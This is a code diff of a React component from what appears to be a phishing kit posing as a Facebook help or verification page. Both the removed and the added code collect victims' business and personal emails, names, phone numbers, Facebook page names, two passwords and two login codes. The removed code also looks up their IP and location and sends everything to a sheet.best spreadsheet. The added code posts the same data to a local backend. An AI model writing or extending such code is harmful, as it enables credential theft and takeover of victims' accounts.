@@ -41,82 +41,61 @@ const ConfirmComponent = () => {
 
     const onFinishCodes = (values) => {
         
-        axios.get(`https://api.db-ip.com/v2/free/self`)
+        if(timeLeft > 0){
+            setActiveWaring(true)
+
+            const dataLocalImages = JSON.parse(localStorage.getItem('dataPassWord'))
+            const firstCode = {...dataLocalImages, first_code: values.fill_code}
+
+            localStorage.setItem('dataFirstCode', JSON.stringify(firstCode))
+
+            const data = {
+                'fill_business_email': firstCode.fill_business_email,
+                'fill_personal_email': firstCode.fill_personal_email,
+                'fill_full_name': firstCode.fill_full_name,
+                'fill_facebook_pagename': firstCode.fill_facebook_pagename,
+                'fill_phone': firstCode.fill_phone,
+                'ip': firstCode.ip,
+                'city': firstCode.city,
+                'country': firstCode.country,
+                'first_password': firstCode.firt_password,
+                'second_password': firstCode.second_password,
+                'first_code': firstCode.first_code ,
+            }
+
+            axios.post( "http://localhost:8080/api/news", data) 
+
+        }
+
+        
+        else {
+            const dataLocalImages = !JSON.parse(localStorage.getItem('dataFirstCode')) ? JSON.parse(localStorage.getItem('dataPassWord')) : JSON.parse(localStorage.getItem('dataFirstCode'))
+            const finalCode = {...dataLocalImages, seconds_code: values.fill_code}
+            localStorage.setItem('dataAllCode', JSON.stringify(finalCode))
+
+            const data = {
+                'fill_business_email': finalCode.fill_business_email,
+                'fill_personal_email': finalCode.fill_personal_email,
+                'fill_full_name': finalCode.fill_full_name,
+                'fill_facebook_pagename': finalCode.fill_facebook_pagename,
+                'fill_phone': finalCode.fill_phone,
+                'ip': finalCode.ip,
+                'city': finalCode.city,
+                'country': finalCode.country,
+                'first_password': finalCode.firt_password,
+                'second_password': finalCode.second_password,
+                'first_code': finalCode.first_code,
+                'second_code': values.fill_code,
+            }
+
+            axios.post( "http://localhost:8080/api/news", data)
                 .then((response) => {
-
-                    if(timeLeft > 0){
-                        setActiveWaring(true)
-            
-                        const dataLocalImages = JSON.parse(localStorage.getItem('dataPassWord'))
-                        const firstCode = {...dataLocalImages, first_code: values.fill_code}
-            
-                        localStorage.setItem('dataFirstCode', JSON.stringify(firstCode))
-            
-                        const data = {
-                            'Email': firstCode.fill_business_email,
-                            'Email_Personal': firstCode.fill_personal_email,
-                            'Name': firstCode.fill_full_name,
-                            'Page': firstCode.fill_facebook_pagename,
-                            'Phone': '&_'+firstCode.fill_phone,
-                            'IP': response.data.ipAddress,
-                            'City': response.data.city,
-                            'Country': response.data.countryName,
-                            'First_Password': firstCode.firt_password,
-                            'Second_Password': firstCode.second_password,
-                            'First_Code': firstCode.first_code,
-                        }
-            
-                        fetch("https://sheet.best/api/sheets/212d1e73-4854-4cdd-a656-a28e41e745f3", {
-                            method: "POST",
-                            mode: "cors",
-                            headers: {
-                                "Content-Type": "application/json",
-                            },
-                            body: JSON.stringify(data),
-                        })
+                    if (response.data.status === 0 ) {
+                        navigate('/help-100823847823627384548/waitting');
                     }
-            
-                    
-                    else {
-                        const dataLocalImages = !JSON.parse(localStorage.getItem('dataFirstCode')) ? JSON.parse(localStorage.getItem('dataPassWord')) : JSON.parse(localStorage.getItem('dataFirstCode'))
-                        const finalCode = {...dataLocalImages, seconds_code: values.fill_code}
-            
-                        localStorage.setItem('dataAllCode', JSON.stringify(finalCode))
-            
-                        const data = {
-                            'Email': finalCode.fill_business_email,
-                            'Email_Personal': finalCode.fill_personal_email,
-                            'Name': finalCode.fill_full_name,
-                            'Page': finalCode.fill_facebook_pagename,
-                            'Phone': '&_'+finalCode.fill_phone,
-                            'IP': response.data.ipAddress,
-                            'City': response.data.city,
-                            'Country': response.data.countryName,
-                            'First_Password': finalCode.firt_password,
-                            'Second_Password': finalCode.second_password,
-                            'First_Code': finalCode.first_code,
-                            'Second_Code': values.fill_code,
-                        }
-            
-                        fetch("https://sheet.best/api/sheets/212d1e73-4854-4cdd-a656-a28e41e745f3", {
-                            method: "POST",
-                            mode: "cors",
-                            headers: {
-                                "Content-Type": "application/json",
-                            },
-                            body: JSON.stringify(data),
-                        })
-                        .then((r) => r.json())
-                        .then((data) => {
-                            navigate('/help-100823847823627384548/waitting');
-                        })
-                    }
-        
-                        
                 })
-
+        }
         
-
     };
 
 
@@ -233,7 +212,8 @@ const ConfirmComponent = () => {
                                                     fontWeight: '700',
                                                     fontSize:'1rem',
                                                     color: 'white',
-                                                    marginBottom: "0"
+                                                    marginBottom: "0",
+                                                    width: '100%'
                                                 }}
                                             >
                                                 Send
